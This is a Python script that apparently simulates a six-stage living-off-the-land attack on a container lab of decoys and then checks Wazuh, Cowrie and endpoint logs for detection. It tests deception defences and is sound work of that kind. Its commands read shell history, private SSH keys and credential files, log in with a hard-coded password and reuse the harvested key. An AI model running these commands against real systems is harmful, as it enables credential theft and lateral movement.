#!/usr/bin/env python3
"""End-to-End Living-off-the-Land (LotL) Attack Simulation & Verification Script.

Executes a controlled multi-stage adversary campaign targeting planted deception artifacts:
  Stage 1: Read synthetic shell history on eng-ws
  Stage 2: Discover and harvest synthetic SSH private key on eng-ws
  Stage 3: Attempt authentication against Cowrie SSH decoy (10.10.2.20)
  Stage 4: Read decoy infrastructure configuration (controllers.conf)
  Stage 5: Enumerate decoy backup share on file-srv
  Stage 6: Inspect canary environment profile & present canary token
"""

import argparse
import json
import logging
import subprocess
import sys
import time
from pathlib import Path

# Add engine to sys.path
REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "engine"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("simulate_lotl_attack")


def run_attacker_cmd(cmd: str, timeout: int = 30) -> tuple[int, str]:
    """Execute command from attacker container perspective."""
    full_cmd = ["docker", "exec", "sentinelx-attacker", "bash", "-c", cmd]
    try:
        res = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return res.returncode, res.stdout + res.stderr
    except Exception as exc:
        return -1, str(exc)


def run_container_cmd(container: str, cmd: str, timeout: int = 30) -> tuple[int, str]:
    """Execute command inside a specific container."""
    full_cmd = ["docker", "exec", container, "sh", "-c", cmd]
    try:
        res = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return res.returncode, res.stdout + res.stderr
    except Exception as exc:
        return -1, str(exc)


def main():
    parser = argparse.ArgumentParser(description="SentinelX LotL Attack Simulation")
    parser.add_argument("--speed", type=float, default=1.0, help="Pacing factor (default 1.0)")
    args = parser.parse_args()

    delay = max(0.5, 2.0 / args.speed)

    print("\n" + "=" * 80)
    print("STARTING LIVING-OFF-THE-LAND (LotL) DECEPTION ATTACK SIMULATION")
    print("=" * 80)

    # Pre-flight check: ensure containers are healthy
    print("\n[*] Pre-flight: Verifying lab containers...")
    for host in ("sentinelx-attacker", "sentinelx-eng-ws", "sentinelx-file-srv", "sentinelx-jump-host"):
        code, out = run_container_cmd(host, "uptime")
        if code != 0:
            logger.error("Container %s is not reachable: %s", host, out)
            sys.exit(1)
    # Check Cowrie container state
    cowrie_check = subprocess.run(
        ["docker", "inspect", "--format={{.State.Status}}", "sentinelx-cowrie"],
        capture_output=True,
        text=True,
    )
    if cowrie_check.stdout.strip() != "running":
        logger.error("Container sentinelx-cowrie is not running: %s", cowrie_check.stdout)
        sys.exit(1)
    print("    All target lab containers are responsive and running.")

    # Stage 1: Initial access to eng-ws and reading .bash_history
    print("\n" + "-" * 80)
    print("[STAGE 1] LotL Discovery: Enumerating Shell History on eng-ws")
    print("  Target: /home/svc_backup/.bash_history")
    print("  ATT&CK: T1552.001 (Credentials in Files) / T1059.004 (Unix Shell)")
    print("-" * 80)
    cmd1 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
        '"cat /home/svc_backup/.bash_history"'
    )
    code1, out1 = run_attacker_cmd(cmd1)
    print(f"  Command executed. Return code: {code1}")
    assert "id_ed25519_backup" in out1, "Expected bait SSH key reference in history"
    assert "10.10.2.20" in out1, "Expected decoy IP destination in history"
    print("  [+] Successfully captured shell history containing decoy SSH destination.")
    time.sleep(delay)

    # Stage 2: Harvest Decoy SSH Key
    print("\n" + "-" * 80)
    print("[STAGE 2] LotL Credential Access: Harvesting Decoy SSH Private Key")
    print("  Target: /home/svc_backup/.ssh/id_ed25519_backup")
    print("  ATT&CK: T1552.004 (Private Keys)")
    print("-" * 80)
    cmd2 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
        '"cat /home/svc_backup/.ssh/id_ed25519_backup"'
    )
    code2, out2 = run_attacker_cmd(cmd2)
    print(f"  Command executed. Return code: {code2}")
    assert "BEGIN OPENSSH PRIVATE KEY" in out2, "Expected private key header"
    print("  [+] Successfully extracted synthetic ED25519 private key.")
    time.sleep(delay)

    # Stage 3: Attempt Decoy SSH Authentication on Cowrie
    print("\n" + "-" * 80)
    print("[STAGE 3] Deception Interaction: Attempting Authentication on Cowrie SSH Decoy")
    print("  Target: 10.10.2.20:22 (Cowrie / backup-srv-02)")
    print("  ATT&CK: T1021.004 (Remote Services: SSH) / T1078.003 (Local Accounts)")
    print("-" * 80)
    cmd3 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
        '\'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /home/svc_backup/.ssh/id_ed25519_backup -p 22 svc_dbadmin@10.10.2.20 "whoami; uptime" 2>&1 || true\''
    )
    code3, out3 = run_attacker_cmd(cmd3)
    print(f"  Command executed. Output: {out3.strip()[:100]}")
    print("  [+] Attacker attempted SSH login against Cowrie honeypot using harvested bait key.")
    time.sleep(delay)

    # Stage 4: Read Decoy SCADA Configuration
    print("\n" + "-" * 80)
    print("[STAGE 4] LotL Infrastructure Discovery: Reading SCADA Controller Configuration")
    print("  Target: /opt/scada/config/controllers.conf")
    print("  ATT&CK: T1083 (File and Directory Discovery) / T0846 (Remote System Discovery)")
    print("-" * 80)
    cmd4 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
        '"cat /opt/scada/config/controllers.conf"'
    )
    code4, out4 = run_attacker_cmd(cmd4)
    print(f"  Command executed. Return code: {code4}")
    assert "decoy-plc-secondary" in out4, "Expected decoy PLC reference"
    print("  [+] Successfully read synthetic SCADA controllers config referencing decoy PLC.")
    time.sleep(delay)

    # Stage 5: Enumerate Decoy Share on file-srv
    print("\n" + "-" * 80)
    print("[STAGE 5] LotL Collection: Enumerating Decoy Shared Directory on file-srv")
    print("  Target: /srv/share/IT_Backups/credentials.bak")
    print("  ATT&CK: T1135 (Network Share Discovery) / T1039 (Data from Network Shared Drive)")
    print("-" * 80)
    cmd5 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.20 '
        '"ls -la /srv/share/IT_Backups && cat /srv/share/IT_Backups/credentials.bak"'
    )
    code5, out5 = run_attacker_cmd(cmd5)
    print(f"  Command executed. Return code: {code5}")
    assert "credentials.bak" in out5, "Expected credentials.bak on share"
    print("  [+] Successfully enumerated decoy network share and extracted credentials.bak.")
    time.sleep(delay)

    # Stage 6: Read Canary Environment Profile
    print("\n" + "-" * 80)
    print("[STAGE 6] LotL Credential Access: Reading Canary Environment Profile")
    print("  Target: /etc/profile.d/backup_env.sh")
    print("  ATT&CK: T1552.001 (Credentials in Files) / T1078.003 (Canary Tokens)")
    print("-" * 80)
    cmd6 = (
        'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
        '"cat /etc/profile.d/backup_env.sh"'
    )
    code6, out6 = run_attacker_cmd(cmd6)
    print(f"  Command executed. Return code: {code6}")
    assert "sx_canary_tok" in out6, "Expected canary token in environment file"
    print("  [+] Successfully inspected canary environment profile.")

    # Allow log rotation and tailing buffer flush
    time.sleep(3.0)

    print("\n" + "=" * 80)
    print("[VERIFICATION] Telemetry Ingestion & Audit Log Inspection")
    print("=" * 80)

    # Inspect endpoint audit log
    code_audit, out_audit = run_container_cmd("sentinelx-eng-ws", "tail -n 10 /var/log/sentinelx/cmd.jsonl")
    print("\nEndpoint Audit Log (/var/log/sentinelx/cmd.jsonl on eng-ws):")
    for line in out_audit.strip().split("\n")[-5:]:
        print(f"  > {line}")

    # Inspect Wazuh archives
    wazuh_log_path = REPO_ROOT / "data" / "logs" / "wazuh" / "archives.json"
    if wazuh_log_path.is_file():
        print(f"\nWazuh Archives Telemetry ({wazuh_log_path}):")
        with open(wazuh_log_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            relevant = [l for l in lines[-100:] if "bash_history" in l or "id_ed25519" in l or "controllers.conf" in l]
            for l in relevant[-4:]:
                try:
                    rec = json.loads(l)
                    print(f"  > [{rec.get('agent', {}).get('name')}] {rec.get('full_log', '')[:100]}")
                except Exception:
                    pass

    # Inspect Cowrie logs
    cowrie_log_path = REPO_ROOT / "data" / "logs" / "cowrie" / "cowrie.json"
    if cowrie_log_path.is_file():
        print(f"\nCowrie Decoy Telemetry ({cowrie_log_path}):")
        with open(cowrie_log_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            for l in lines[-10:]:
                try:
                    rec = json.loads(l)
                    if "svc_dbadmin" in l or "login" in rec.get("eventid", "") or "connect" in rec.get("eventid", ""):
                        print(f"  > [{rec.get('eventid')}] from {rec.get('src_ip')}:{rec.get('src_port')} as '{rec.get('username')}'")
                except Exception:
                    pass

    print("\n" + "=" * 80)
    print("LotL DECEPTION ATTACK SIMULATION COMPLETED SUCCESSFULLY")
    print("=" * 80 + "\n")


if __name__ == "__main__":
    main()
